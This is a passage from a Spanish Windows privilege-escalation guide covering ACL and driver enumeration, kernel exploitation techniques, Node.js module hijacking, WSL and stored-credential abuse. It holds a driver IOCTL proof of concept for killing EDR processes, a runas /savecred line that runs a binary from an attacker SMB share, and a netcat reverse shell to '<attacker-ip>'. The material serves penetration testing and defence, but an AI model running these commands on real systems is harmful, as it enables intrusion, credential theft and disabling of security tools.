El Windows Driver Kit opcional incluye `StandaloneRunner.exe`, que puede usar `command.txt`, `reboot.rsf` y un archivo de proyecto `working\rsf.rsf` desde su directorio de ejecución. Una tarea programada o un servicio que inicie este helper con una cuenta privilegiada puede convertir el acceso de escritura de bajo privilegio a esas entradas en ejecución de comandos en el contexto de esa cuenta, incluso si el propio ejecutable del helper está protegido. Confirma que el consumidor privilegiado existe y que **ambos** archivos auxiliares se pueden crear o modificar; encontrar el helper por sí solo no es suficiente.

En una tarea programada, revisa su [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) y las ACL de las dos rutas de los archivos auxiliares. Si la tarea no especifica un directorio de trabajo, el directorio del ejecutable es solo un indicio que se debe verificar, no una prueba de dónde lee la tarea sus entradas. También se debe cumplir el requisito previo del archivo de trabajo del proyecto. Comprueba el principal real de la tarea en lugar de asumir que se ejecuta como SYSTEM.

## Aplicaciones

### Aplicaciones instaladas

Comprueba los **permisos de los binarios** (quizá puedas sobrescribir uno y escalar privilegios) y de las **carpetas** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Ruta de reparación del agente de Windows de Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) afecta a versiones antiguas de los agentes de Windows de Checkmk que escribían archivos de comandos en `C:\Windows\Temp` y luego ejecutaban un archivo preexistente protegido contra escritura cuando fallaba su reemplazo. El proveedor corrigió el problema en 2.1.0p40, 2.2.0p23, 2.3.0b1 y 2.4.0b1. Comprueba el nivel de parche completo instalado y si se puede ejecutar la operación afectada del agente; una etiqueta que solo indica la rama, como `2.1`, no permite determinar si el sistema está expuesto. La enumeración puede revisar la versión, el estado del servicio y los permisos de Temp sin crear archivos ni activar comandos del agente.

#### Revisión del servicio SAML de ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) afectaba a ADSelfService Plus, versión 6210 y anteriores; el proveedor lo corrigió en la versión 6211. Solo es relevante si SAML SSO **está o estuvo** habilitado. Por lo tanto, una entrada de producto instalado o una ruta de servicio es un indicio, no una confirmación de vulnerabilidad: confirma la versión exacta, el historial de configuración de SAML, la accesibilidad de red del servicio y la cuenta con la que se ejecuta. La ejecución de código a través del servicio hereda los privilegios de esa cuenta; para ejecutar como SYSTEM, la instancia debe ejecutarse como SYSTEM. Un archivo `OfflineBackup_*.ezip` legible en el directorio Backup del producto es un indicio independiente de una copia de seguridad cifrada, no una prueba de que contenga credenciales utilizables ni de esta falla de SAML. Durante la enumeración rutinaria, registra su ruta y permisos de acceso sin descomprimirlo.

#### Límites entre el controlador de Jenkins y las cuentas de dominio

En un controlador Jenkins de Windows, distingue entre el permiso para crear o configurar un job y el permiso para iniciarlo: [Jenkins los documenta como permisos separados: `Job/Create`, `Job/Configure` y `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Una programación configurada o un activador remoto pueden ofrecer otra vía para ejecutar una compilación, pero confirma que estén habilitados y que la compilación se ejecute realmente. La ejecución usa la identidad del controlador o del agente seleccionado, y una credencial almacenada solo se puede utilizar si el job tiene acceso a su ámbito. Por separado, revisa el acceso a los metadatos de `JENKINS_HOME`: Jenkins guarda material de credenciales y claves de cifrado en `credentials.xml`, `secrets/hudson.util.Secret` y `secrets/master.key` ([almacenamiento de secretos de Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Su mera presencia no revela una contraseña; verifica el **acceso de lectura a los archivos necesarios** y una vía independiente de reutilización de cuentas, sin imprimir secretos en una salida compartida. Si esa cuenta tiene permiso de escritura en `scriptPath` del objeto de usuario de AD, confirma que la ruta del script permita escritura y que exista un proceso real de inicio de sesión o programado que lo ejecute como el usuario objetivo antes de considerarlo ejecución entre usuarios. Cualquier control adicional de grupos requiere verificar por separado los permisos efectivos de AD.

#### Identidad del agente autohospedado de Azure Pipelines

En un proyecto de Azure DevOps Server o Azure Pipelines, distingue entre el permiso para **crear o editar** una pipeline y el permiso para **ponerla en cola** y usar el pool de agentes seleccionado; [Microsoft documenta por separado los permisos de pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) y la [autorización del pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Si una cuenta con menos privilegios puede enviar un paso de script y ejecutar esa pipeline en un agente autohospedado de Windows, el paso se ejecuta como la [cuenta del sistema operativo configurada para el agente](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Antes de afirmar que hay una transición entre usuarios o a SYSTEM, verifica la pipeline exacta, las restricciones de ramas y recursos, el pool autorizado, que el job pueda ejecutarse y la identidad del servicio del agente. La presencia de un agente instalado, un rol en el proyecto o permisos de escritura en el repositorio son solo indicios; revisa los permisos y los metadatos del servicio local sin iniciar una compilación durante la enumeración pasiva.

#### Credenciales de Microsoft Entra Connect Sync

[Microsoft distingue](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) entre la **cuenta de servicio de ADSync**, que ejecuta el servicio de sincronización y accede a su base de datos SQL, y la **cuenta del conector de AD DS**, cuyos permisos en el directorio dependen de las funciones de sincronización configuradas. Las credenciales del conector se almacenan cifradas en esa base de datos; el material de claves está [protegido por DPAPI bajo la cuenta de servicio de ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). La presencia de un servicio de sincronización instalado, un grupo cuyo nombre sugiera que incluye administradores locales o el acceso a la base de datos no demuestran por sí solos que haya credenciales que se puedan descifrar ni que sea posible escalar privilegios en el dominio. Revisa por separado los permisos reales de lectura de la base de datos, el acceso a la cuenta de servicio y a sus claves, la instalación y la disposición de SQL, la identidad configurada para el conector y los privilegios efectivos de esa identidad en AD. La enumeración rutinaria debe mostrar únicamente metadatos del servicio y de acceso, no consultar ni imprimir los secretos almacenados.

#### Permisos de las DLL de compatibilidad de controladores de impresora

Un controlador de impresora instalado puede guardar DLL de compatibilidad en `C:\ProgramData` y cargarlas en un proceso de impresión con más privilegios. Revisa los ACL exactos del directorio del controlador y de las DLL, incluidos los directorios superiores y los puntos de reanálisis, incluso si se deniega la enumeración de impresoras mediante WMI. Para el [problema del controlador de impresora Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), la ruta reportada era `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [la divulgación original](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) describe la carga de DLL por parte de `PrintIsolationHost.exe`. Un ACL que permita escritura es solo un indicio: verifica el acceso efectivo de escritura teniendo en cuenta las entradas de denegación, que el controlador correspondiente esté instalado y cargue el archivo con una identidad privilegiada, y si el controlador actualizado o el programa de seguridad del proveedor corrigieron la instalación. No deduzcas que hay una vulnerabilidad basándote únicamente en el nombre del directorio o la versión del controlador.

### Permisos de escritura

Comprueba si puedes modificar algún archivo de configuración para leer un archivo especial, o si puedes modificar algún binario que vaya a ejecutarse con una cuenta de Administrador (schedtasks).

Una forma de encontrar permisos débiles en carpetas y archivos del sistema es hacer lo siguiente:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Persistencia/ejecución mediante carga automática de plugins de Notepad++

Notepad++ carga automáticamente cualquier DLL de plugin que esté en sus subcarpetas `plugins`. Si hay una instalación portable o una copia con permisos de escritura, colocar un plugin malicioso permite la ejecución automática de código dentro de `notepad++.exe` en cada inicio (incluidos `DllMain` y las callbacks del plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Ejecutar al inicio

**Comprueba si puedes sobrescribir algún registro o binario que vaya a ejecutar otro usuario.**\
**Lee** la **siguiente página** para obtener más información sobre **ubicaciones de autoruns interesantes para escalar privilegios**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Busca drivers posibles **extraños/vulnerables de terceros**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Si un driver expone una primitiva arbitraria de lectura/escritura del kernel (algo común en handlers de IOCTL mal diseñados), puedes escalar privilegios robando directamente un token SYSTEM de la memoria del kernel.<sup>[[13]](#references)</sup> Consulta aquí la técnica paso a paso:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

En bugs de race condition en los que la llamada vulnerable abre una ruta de Object Manager controlada por el atacante, ralentizar deliberadamente la búsqueda (usando componentes de longitud máxima o cadenas profundas de directorios) puede ampliar la ventana de microsegundos a decenas de microsegundos:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### UAF de cancel-safe queue, divulgaciones de paged-pool y pivotes de I/O ring

Algunas cadenas de LPE del kernel de Windows pueden construirse a partir de dos bugs débiles por separado: una **race de ciclo de vida en una cancel-safe queue** que libera una solicitud/CBD mientras el lock de la queue sigue retenido, y una divulgación por **liberación del lock antes de copiar** que filtra una asignación liberada de paged-pool durante `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Notas de auditoría y explotación:

- **Liberar con el lock retenido y luego cancelar**: busca una ruta de éxito que haga **Acquire -> CompleteRequest/free -> Release**, mientras que la ruta de cancelación hace **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Si la ruta de éxito llega a `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` antes de liberar el lock de CBDQ/CSQ, un thread bloqueado en `NtCancelIoFileEx -> IopCsqCancelRoutine` puede reanudarse más tarde y pasar un `PFLT_CALLBACK_DATA` liberado al callback de eliminación del driver.
- **Reclamar el objeto liberado de la queue** con una asignación de paged-pool del mismo tamaño y controlada por el atacante. Las entradas de la queue de datos de `NPFS` son útiles porque el payload y el tamaño son controlables, y luego puedes examinarlas con operaciones de lectura/peek de pipe. Si el objeto liberado contiene enlaces de lista, sobrescríbelos con una **lista cíclica de nodos de solicitud falsos en memoria de usuario** para que el driver procese repetidamente estructuras de solicitud definidas por el atacante en vez de detenerse en el head original de la lista.
- **Mejorar una escritura predecible**: si la solicitud falsa redirige un puntero de contexto anidado que se usa para escrituras de bookkeeping (marcas de tiempo / QPC / campos adyacentes al refcount), podrías obtener una escritura del kernel **con dirección controlada, pero no con valor controlado**. En ese caso, apunta al campo **length/size** de un objeto de pool rociado en vez de a un puntero final de código/datos; luego recorre el spray hasta que el objeto corrompido permita una **lectura fuera de límites de paged-pool**.
- **Patrón de divulgación explotable mediante race**: cualquier syscall que haga `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` es un buen candidato. La fiabilidad mejora cuando el atacante puede agrandar el buffer copiado (por ejemplo, añadiendo muchas entradas de lista/recurso que aumenten el tamaño final de asignación de un serializador), porque la copia más larga amplía la ventana de reemplazo sin necesariamente bloquear el sistema.
- **Objetivos de refill con muchos punteros**: los arrays de buffers registrados de Windows **I/O ring** son excelentes objetivos de divulgación porque su tamaño de paged-pool está controlado por el atacante (`8 * regBufferCnt`) y cada elemento es un puntero del kernel a un `_IOP_MC_BUFFER_ENTRY`. Filtra uno de estos arrays, recupera el `IORING_OBJECT` circundante y luego corrompe **`RegBuffers`** y **`RegBuffersCount`** para que las operaciones posteriores de I/O ring consuman entradas falsificadas por el atacante y permitan lectura/escritura arbitraria del kernel. Si la única escritura disponible produce un byte estable (por ejemplo, a partir de `KUSER_SHARED_DATA+0x14`), usa **escrituras desalineadas superpuestas** para construir un puntero de usuario de bytes repetidos como `0x0101010101010101`, mapéalo con `VirtualAlloc` y coloca allí el array de buffers registrados falsificado.<sup>[[30]](#references)</sup>

Indicadores útiles para la depuración:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Una vez que obtengas lectura/escritura arbitraria del kernel mediante el I/O ring corrupto, roba un token SYSTEM usando el flujo de trabajo estándar posterior a la primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives de corrupción de memoria de registry hive

Las vulnerabilidades modernas de hive permiten preparar layouts deterministas, aprovechar descendientes escribibles de HKLM/HKU y convertir la corrupción de metadatos en desbordamientos de kernel paged-pool sin un driver personalizado. Aprende la cadena completa aquí:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Confusión de tipos en modo directo de `RtlQueryRegistryValues` desde rutas controladas por el atacante

Algunos drivers aceptan una ruta de registry desde userland, solo validan que sea una cadena UTF-16 válida y luego llaman a `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` con `RTL_QUERY_REGISTRY_DIRECT` hacia un escalar en la pila, como `int readValue`. Si falta `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` se interpreta según el tipo **real** del registry, no el tipo que esperaba el desarrollador.

Esto crea dos primitives útiles:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: una ruta absoluta `\Registry\...` controlada por el usuario permite que el driver consulte claves elegidas por el atacante, revele su existencia mediante códigos de retorno o logs y, en ocasiones, lea valores a los que el caller no podría acceder directamente.
- **Corrupción de memoria del kernel**: un destino escalar como `&readValue` queda sujeto a confusión de tipos como `REG_QWORD`, `UNICODE_STRING` o un búfer binario de tamaño variable, según el tipo del valor del registry.

Notas prácticas sobre la explotación:

- **Mitigación de Windows 8+**: si la consulta accede a un **untrusted hive** con `RTL_QUERY_REGISTRY_DIRECT` pero sin `RTL_QUERY_REGISTRY_TYPECHECK`, los callers del kernel provocan un crash con `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Para mantener la explotabilidad, busca **claves escribibles por el atacante dentro de hives de sistema de confianza** en lugar de preparar valores bajo `HKCU`.
- **Preparación en un trusted hive**: usa NtObjectManager para enumerar descendientes escribibles de `\Registry\Machine` y vuelve a ejecutar el escaneo con un token **low-integrity** duplicado para encontrar claves accesibles desde contextos sandboxed:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: una escritura directa de 8 bytes en un `int` de 4 bytes corrompe datos adyacentes de la pila y puede sobrescribir parcialmente un puntero de callback/función cercano.
- **`REG_SZ` / `REG_EXPAND_SZ`**: el modo directo espera que `EntryContext` apunte a un `UNICODE_STRING`. Si el código primero carga un `REG_DWORD` controlado por un atacante en un escalar de la pila y luego reutiliza ese mismo búfer para leer una cadena, el atacante controla `Length`/`MaximumLength` e influye parcialmente en el puntero `Buffer`, lo que permite una escritura en el kernel semicontrolada.
- **`REG_BINARY`**: para datos binarios grandes, el modo directo trata el primer `LONG` en `EntryContext` como el tamaño de un búfer con signo. Si una lectura previa de `REG_DWORD` deja un valor **negativo** controlado por un atacante en el escalar reutilizado, la siguiente consulta `REG_BINARY` copia bytes controlados por el atacante directamente sobre slots adyacentes de la pila, lo que suele ser la vía más limpia para sobrescribir completamente un puntero de callback.

Patrón de búsqueda clave: **lecturas heterogéneas del registro en la misma variable de la pila sin reinicializarla**. Busca `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, punteros `EntryContext` reutilizados y rutas de código en las que la primera lectura del registro determina si se realiza una segunda lectura.

#### Abusar de la ausencia de FILE_DEVICE_SECURE_OPEN en objetos de dispositivo (LPE + eliminación de EDR)

Algunos drivers firmados de terceros crean su objeto de dispositivo con un SDDL sólido mediante IoCreateDeviceSecure, pero olvidan establecer FILE_DEVICE_SECURE_OPEN en DeviceCharacteristics. Sin este flag, la DACL segura no se aplica cuando se abre el dispositivo mediante una ruta que contiene un componente adicional, lo que permite que cualquier usuario sin privilegios obtenga un handle usando una ruta del espacio de nombres como:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (de un caso real)

Una vez que un usuario puede abrir el dispositivo, es posible abusar de los IOCTL privilegiados que expone el driver para lograr LPE y manipulación. Capacidades observadas en la práctica:
- Devolver handles con acceso total a procesos arbitrarios (robo de tokens / shell de SYSTEM mediante DuplicateTokenEx/CreateProcessAsUser).
- Lectura/escritura sin restricciones en el disco sin procesar (manipulación sin conexión, trucos de persistencia durante el arranque).
- Terminar procesos arbitrarios, incluidos Protected Process/Light (PP/PPL), lo que permite eliminar AV/EDR desde el espacio de usuario mediante el kernel.

Patrón mínimo de PoC (modo de usuario):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigaciones para desarrolladores
- Establece siempre FILE_DEVICE_SECURE_OPEN al crear objetos de dispositivo que deban estar restringidos por una DACL.
- Valida el contexto del caller para las operaciones privilegiadas. Añade comprobaciones de PP/PPL antes de permitir la terminación de procesos o la devolución de handles.
- Restringe los IOCTL (máscaras de acceso, METHOD_*, validación de entradas) y considera usar modelos brokered en lugar de privilegios directos del kernel.

Ideas de detección para defensores
- Supervisa las aperturas desde user mode de nombres de dispositivo sospechosos (p. ej., \\ .\\amsdk*) y las secuencias específicas de IOCTL que puedan indicar abuso.
- Aplica la lista de bloqueo de drivers vulnerables de Microsoft (HVCI/WDAC/Smart App Control) y mantén tus propias listas de permitidos y denegados.


## PATH DLL Hijacking

Si tienes **permisos de escritura en una carpeta incluida en PATH**, podrías secuestrar una DLL cargada por un proceso y **escalar privilegios**.<sup>[[2]](#references)</sup>

Comprueba los permisos de todas las carpetas incluidas en PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Para obtener más información sobre cómo abusar de esta comprobación:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Secuestro de la resolución de módulos de Node.js / Electron mediante `C:\node_modules`

Esta es una variante de **ruta de búsqueda no controlada de Windows** que afecta a las aplicaciones **Node.js** y **Electron** cuando realizan una importación sin ruta, como `require("foo")`, y el módulo esperado **no está**.<sup>[[20]](#references)</sup>

Node resuelve los paquetes recorriendo el árbol de directorios y comprobando las carpetas `node_modules` en cada directorio padre. En Windows, ese recorrido puede llegar a la raíz de la unidad, por lo que una aplicación iniciada desde `C:\Users\Administrator\project\app.js` podría terminar buscando en:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Si un **usuario con pocos privilegios** puede crear `C:\node_modules`, puede colocar un `foo.js` malicioso (o una carpeta de paquete) y esperar a que un **proceso Node/Electron con más privilegios** resuelva la dependencia que falta. El payload se ejecuta en el contexto de seguridad del proceso víctima, por lo que esto se convierte en **LPE** cuando el objetivo se ejecuta como administrador, desde una tarea programada elevada o un contenedor de servicio, o desde una aplicación de escritorio privilegiada que se inicia automáticamente.

Esto es especialmente común cuando:

- una dependencia está declarada en `optionalDependencies`<sup>[[22]](#references)</sup>
- una biblioteca de terceros incluye `require("foo")` en un `try/catch` y continúa si falla
- se eliminó un paquete de las compilaciones de producción, se omitió durante el empaquetado o no se pudo instalar
- el `require()` vulnerable está muy dentro del árbol de dependencias y no en el código principal de la aplicación

### Búsqueda de objetivos vulnerables

Usa **Procmon** para confirmar la ruta de resolución:<sup>[[23]](#references)</sup>

- Filtra por `Process Name` = ejecutable objetivo (`node.exe`, el EXE de la aplicación Electron o el proceso contenedor)
- Filtra por `Path` `contains` `node_modules`
- Céntrate en `NAME NOT FOUND` y en la última apertura exitosa en `C:\node_modules`

Patrones útiles para revisar el código en archivos `.asar` desempaquetados o en el código fuente de la aplicación:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Identifica el **nombre del paquete que falta** mediante Procmon o revisando el código fuente.
2. Crea el directorio de búsqueda raíz si aún no existe:

```powershell
mkdir C:\node_modules
```

3. Coloca un módulo con el nombre exacto esperado:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Activa la aplicación víctima. Si la aplicación intenta `require("foo")` y el módulo legítimo no está presente, Node puede cargar `C:\node_modules\foo.js`.

Algunos ejemplos reales de módulos opcionales ausentes que encajan con este patrón son `bluebird` y `utf-8-validate`, pero la **técnica** es lo reutilizable: encuentra cualquier **importación bare ausente** que un proceso privilegiado de Windows Node/Electron vaya a resolver.

### Ideas de detección y hardening

- Genera una alerta cuando un usuario cree `C:\node_modules` o escriba nuevos archivos/paquetes `.js` allí.
- Busca procesos de alta integridad que lean desde `C:\node_modules\*`.
- Incluye todas las dependencias de runtime en producción y audita el uso de `optionalDependencies`.
- Revisa el código de terceros en busca de patrones silenciosos `try { require("...") } catch {}`.
- Desactiva las comprobaciones opcionales cuando la biblioteca lo permita (por ejemplo, algunas implementaciones de `ws` pueden evitar la comprobación heredada de `utf-8-validate` con `WS_NO_UTF_8_VALIDATE=1`).

## Red

### Recursos compartidos

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### archivo hosts

Comprueba si hay otros equipos conocidos codificados en el archivo hosts

```
type C:\Windows\System32\drivers\etc\hosts
```

### Interfaces de red y DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Puertos abiertos

Comprueba desde el exterior si hay **servicios restringidos**.

```bash
netstat -ano #Opened ports?
```

Para un listener local, correlaciona su PID con el propietario del proceso, la ruta del ejecutable y cualquier servicio o tarea programada que lo inicie. Un servicio de control remoto puede dar acceso como su usuario de escritorio solo si sus controles de autenticación y comandos lo permiten. Una aplicación TCP personalizada que se ejecuta con una cuenta con más privilegios es un objetivo de revisión aparte: el listener y la ruta del binario son indicios pasivos, mientras que una vía de corrupción de memoria autenticada requiere analizar ese binario específico y la entrada a la que puede acceder. Si un puerto expuesto parece pertenecer a un proceso del sistema, compáralo con [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) antes de atribuirle el servicio backend; una regla de reenvío por sí sola no demuestra que el destino sea accesible o vulnerable.

### Tabla de enrutamiento

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Tabla ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Reglas del firewall

[**Consulta esta página para ver comandos relacionados con el firewall**](../basic-cmd-for-pentesters.md#firewall) **(listar reglas, crear reglas, desactivar, desactivar...)**

Más[ comandos para enumerar la red aquí](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

El binario `bash.exe` también se puede encontrar en `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Si obtienes el usuario root, puedes escuchar en cualquier puerto (la primera vez que uses `nc.exe` para escuchar en un puerto, aparecerá una ventana GUI que preguntará si se debe permitir `nc` a través del firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Para iniciar fácilmente bash como root, puedes probar `--default-user root`

Puedes explorar el sistema de archivos de `WSL` en la carpeta `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Tener acceso como `root` de Linux dentro de WSL no otorga por sí solo derechos de administrador de Windows. Si la identidad actual de Windows puede leer el sistema de archivos de una distribución, revisa los archivos del historial del shell (incluido `/root/.bash_history`) en busca de comandos que puedan haber registrado credenciales; para la escalada, sigue siendo necesaria una cuenta válida con privilegios superiores y una vía de autenticación permitida. La estructura `LocalState\rootfs` corresponde a instalaciones antiguas de WSL; WSL 2 suele almacenar la distribución en un [disco virtual `ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), así que primero identifica la distribución y la ruta de almacenamiento reales. Evita mostrar el contenido del historial durante la enumeración automatizada.

## Credenciales de Windows

### Credenciales de Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Trata `DefaultUserName` y `DefaultDomainName` como contexto de cuenta, no como credenciales. Un valor no vacío de `DefaultPassword` o `AltDefaultPassword` es un hallazgo de texto sin cifrar en el registro. Si `AutoAdminLogon=1`, pero no se puede leer ninguna contraseña en texto sin cifrar, eso es solo una pista: [Sysinternals Autologon puede almacenar la contraseña como un secreto de LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), y las lecturas habituales del registro no permiten determinar si ese secreto existe o se puede recuperar. Revisa los derechos de acceso y la configuración real del inicio de sesión antes de informar de una exposición de credenciales.

### Administrador de credenciales / Windows Vault

De [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault almacena credenciales para servidores, sitios web y otros programas que **Windows** puede utilizar para **iniciar sesión automáticamente por los usuarios**. Al principio, podría parecer que los usuarios pueden almacenar credenciales de sitios como Facebook, Twitter o Gmail y hacer que los navegadores inicien sesión automáticamente, pero no funciona así.

Windows Vault almacena credenciales que Windows puede usar para iniciar sesión automáticamente por los usuarios. Esto significa que cualquier **aplicación de Windows que necesite credenciales para acceder a un recurso** (servidor o sitio web) **puede utilizar este Administrador de credenciales** y Windows Vault, y usar las credenciales proporcionadas en lugar de que los usuarios introduzcan el nombre de usuario y la contraseña cada vez.

A menos que las aplicaciones interactúen con el Administrador de credenciales, no creo que puedan usar las credenciales de un recurso determinado. Por lo tanto, si tu aplicación quiere utilizar el vault, debería **comunicarse de alguna manera con el Administrador de credenciales y solicitar las credenciales de ese recurso** al vault de almacenamiento predeterminado.

Usa `cmdkey` para enumerar las credenciales almacenadas en la máquina.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Luego puedes usar `runas` con la opción `/savecred` para usar las credenciales guardadas. El siguiente ejemplo ejecuta un binario remoto desde un recurso compartido SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Uso de `runas` con un conjunto de credenciales proporcionadas.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

